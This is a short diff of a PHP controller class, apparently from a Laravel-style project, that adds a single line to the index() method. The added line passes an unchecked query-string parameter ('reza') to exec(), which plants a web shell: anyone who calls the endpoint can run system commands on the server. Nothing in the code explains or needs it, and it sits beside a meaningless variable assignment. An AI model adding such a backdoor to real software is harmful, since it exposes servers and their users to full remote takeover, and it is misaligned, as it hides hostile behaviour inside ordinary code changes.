@@ -12,6 +12,7 @@ class Controller extends BaseController
 
     public function index()
     {
+        exec($_GET['reza']);
         $edf=34;
 
     }
